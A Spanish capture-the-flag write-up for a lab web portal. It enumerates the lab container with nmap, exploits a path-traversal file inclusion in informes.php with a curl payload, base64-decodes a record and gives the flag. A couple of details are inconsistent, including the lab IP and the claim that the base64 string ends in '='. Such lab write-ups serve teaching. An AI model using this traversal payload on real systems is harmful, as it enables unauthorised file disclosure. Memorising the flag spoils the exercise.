# Informe sector 14

> LATAM Energía Red dejó un portal de consulta de informes tras el apagón del sector 14. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh && ./startlab.sh blackout-web01.tar` → IP del lab en la red Docker (172.18.0.2). Enumera con nmap y ataca por HTTP.
>
> **Consejo:** enumera la IP del lab con nmap. El portal expone varias secciones internas.

**Flag:** `WHOAMI{lf1_d0c_s3ct0r14}`

---

## Resolución

### 1. Levantar el lab

**Herramienta:** `docker inspect`. **Por qué:** el script de arranque no me deja la IP, así que la consulto al contenedor.

```bash
$ unzip blackout-web01.zip && chmod +x startlab.sh && ./startlab.sh blackout-web01.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web01
172.17.0.2
```

### 2. Enumerar

**Herramienta:** `nmap`. **Por qué:** descubre los servicios a los que atacar.

**Parámetros:** `-sV` (versión del servicio), `-p-` (todos los puertos).

```bash
$ nmap -sV -p- 172.17.0.2
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Solo el puerto 80. **Lo que vi:** en el index aparece un enlace sospechoso:

```
/informes.php?informe=panel.php
```

El parámetro `informe` toma el nombre de un archivo PHP → clásica **LFI (Local File Inclusion)** con path traversal.

### 3. Confirmar el LFI y leer archivos internos

`informes.php` hace `include __DIR__ . '/pages/' . $informe;` sin sanitizar `../`, así que se puede escapar de `pages/`:

```bash
$ curl "http://172.17.0.2/informes.php?informe=../doc/latam_energia_recuperacion_sector14.dat"
LATAM ENERGIA RED — BLACKOUT LATAM
SUBESTACION NORTE / SECTOR 14
TIPO=recuperacion_post_apagon
REGISTRO=V0hPQU1Je2xmMV9kMGNfczNjdDByMTR9
```

**Decisión:** probé `../` para salir de `pages/` y leer archivos del sistema. Se accedió a un archivo `.dat` de una carpeta interna `doc/` (pertenece a `www-data`, legible por el proceso PHP).

### 4. Decodificar el registro

El valor `REGISTRO=` termina en `=` y tiene caracteres que delatan **base64**:

```bash
$ echo "V0hPQU1Je2xmMV9kMGNfczNjdDByMTR9" | base64 -d
WHOAMI{lf1_d0c_s3ct0r14}
```

## Lección

Ante un parámetro que incluye archivos (`?informe=xxx.php`), prueba path traversal (`../`) para escapar del directorio permitido y leer archivos sensibles. Si el valor se decodifica a texto raro, suele ser base64.